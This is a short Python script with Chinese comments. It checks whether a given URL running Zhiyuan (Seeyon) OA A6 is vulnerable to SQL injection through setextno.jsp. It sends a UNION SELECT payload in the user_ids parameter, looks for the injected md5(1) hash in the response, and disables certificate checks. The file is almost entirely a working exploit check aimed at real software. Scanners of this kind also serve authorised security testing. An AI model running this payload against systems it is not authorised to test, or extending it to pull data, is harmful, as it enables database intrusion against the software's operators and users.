#!/usr/bin/env python
# coding=utf-8
#致远OA A6 setextno.jsp SQL注入漏洞
import requests, threading,base64
from termcolor import colored

requests.packages.urllib3.disable_warnings()  # 忽略证书报错

results = ''


def pscan_vuln(url):
    global results
    try:
        response = requests.get(url=url + '/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#',verify=False,timeout=20)
        bm=response.encoding #获取网页编码
        response.encoding = str(bm) #设置网页编码
        if 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            print(colored('[+]存在致远OAA6setextno.jspSQL注入漏洞', 'red'))
            results = f'{url}-->存在致远OAA6setextno.jspSQL注入漏洞'
        else:
            print('[-]不存在致远OAA6setextno.jspSQL注入漏洞')
    except:
        print('[-]不存在致远OAA6setextno.jspSQL注入漏洞')


def zhiyuanOAsetextnosql(urls):
    threads = []
    t = threading.Thread(target=pscan_vuln, args=(str(urls),))
    threads.append(t)
    t.start()
    for t in threads:
        t.join()
    return results

